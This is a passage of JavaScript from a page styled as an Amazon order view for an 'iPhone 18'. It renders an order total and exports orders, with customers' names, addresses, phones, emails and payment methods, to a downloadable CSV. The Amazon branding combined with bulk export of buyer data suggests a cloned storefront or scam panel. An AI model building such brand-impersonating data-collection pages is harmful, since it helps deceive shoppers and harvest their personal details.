          <td style="padding:10px 0; text-align:center;">${ord.qty || 1}</td>
          <td style="padding:10px 0; text-align:right; font-weight:600;">${ord.price || '$1,799.00'}</td>
        </tr>
      </tbody>
    </table>

    <div style="margin-left:auto; width:240px; border-top:1px solid #ccc; padding-top:8px;">
      <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
        <span>Item(s) Subtotal:</span>
        <span>${ord.price || '$1,799.00'}</span>
      </div>
      <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
        <span>Shipping &amp; Handling:</span>
        <span style="color:#007600;">$0.00</span>
      </div>
      <div style="display:flex; justify-content:space-between; font-weight:700; font-size:15px; border-top:1px solid #0f1111; padding-top:6px; margin-top:6px;">
        <span>Grand Total:</span>
        <span style="color:#b12704;">${ord.price || '$1,799.00'}</span>
      </div>
    </div>
  `;

  modal.style.display = "flex";
}

function exportOrdersToCSV(orders) {
  const headers = ["Order ID", "Date", "Customer Name", "Address", "Phone", "Email", "Item", "Price", "Quantity", "Payment Method"];
  const rows = orders.map(o => [
    `"${(o.orderId || '').replace(/"/g, '""')}"`,
    `"${(o.dateStr || '').replace(/"/g, '""')}"`,
    `"${(o.name || '').replace(/"/g, '""')}"`,
    `"${(o.address || '').replace(/"/g, '""')}"`,
    `"${(o.phoneNumber || '').replace(/"/g, '""')}"`,
    `"${(o.email || '').replace(/"/g, '""')}"`,
    `"${(o.item || '').replace(/"/g, '""')}"`,
    `"${(o.price || '').replace(/"/g, '""')}"`,
    `"${o.qty || 1}"`,
    `"${(o.payMethod || '').replace(/"/g, '""')}"`
  ]);

  const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement("a");
  link.setAttribute("href", encodedUri);
  link.setAttribute("download", `amazon_iphone18_orders_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

function setupAmazonRedirects() {
  // Direct shortcuts
}

function setupLanguageSwitcher() {
  // Clean dismiss
  const banner = document.getElementById("amazonTranslateBanner");
  const btnClose = document.getElementById("btnCloseTranslateBanner");
  const btnDismiss = document.getElementById("btnDismissTranslate");
  if (btnClose && banner) {
    btnClose.addEventListener("click", () => banner.style.display = "none");
  }
  if (btnDismiss && banner) {
    btnDismiss.addEventListener("click", () => banner.style.display = "none");
  }
}

function showToast(msg) {
  const toast = document.getElementById("amazonToast");
  if (!toast) return;
  toast.textContent = msg;
  toast.style.display = "block";
  toast.classList.add("show");
  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => toast.style.display = "none", 300);
  }, 3500);
}
